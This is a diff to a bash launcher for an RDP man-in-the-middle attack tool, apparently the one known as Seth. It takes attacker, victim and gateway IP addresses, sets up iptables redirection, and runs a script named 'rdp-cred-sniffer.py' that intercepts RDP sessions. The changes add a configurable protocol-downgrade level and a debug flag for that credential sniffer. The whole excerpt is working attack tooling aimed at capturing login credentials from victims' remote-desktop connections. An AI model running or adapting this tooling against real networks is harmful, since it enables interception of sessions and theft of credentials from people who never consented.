@@ -2,10 +2,10 @@
 
 set -e
 
-if [ "$#" -lt 4 ]; then
+if [ "$#" -ne 4 ]; then
     cat << EOF
 Usage:
-$0 <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP> [<RDP_SNIFFER_PARAMS>]
+$0 <INTERFACE> <ATTACKER_IP> <VICTIM_IP> <GATEWAY_IP>
 EOF
     exit 1
 fi
@@ -14,7 +14,14 @@ IFACE="$1"
 ATTACKER_IP="$2"
 VICTIM_IP="$3"
 GATEWAY_IP="$4"
-RDP_SNIFFER_PARAMS="${@:5}"
+
+if [ -z "$SETH_DOWNGRADE" ] ; then
+    SETH_DOWNGRADE=3
+fi
+
+if [ ! -z "$SETH_DEBUG" ] ; then
+    DEBUG_FLAG="-d"
+fi
 
 IP_FORWARD="$(cat /proc/sys/net/ipv4/ip_forward)"
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
@@ -95,5 +102,7 @@ set_iptables_2 A "$VICTIM_IP" "$ATTACKER_IP" "$ORIGINAL_DEST"
 
 echo "[*] Run RDP proxy..."
 
-$SCRIPT_DIR/rdp-cred-sniffer.py -c "$CERTPATH" -k "$KEYPATH" \
-    "$ORIGINAL_DEST" $RDP_SNIFFER_PARAMS
+$SCRIPT_DIR/rdp-cred-sniffer.py \
+    $DEBUG_FLAG -g "$SETH_DOWNGRADE" \
+    -c "$CERTPATH" -k "$KEYPATH" \
+    "$ORIGINAL_DEST"
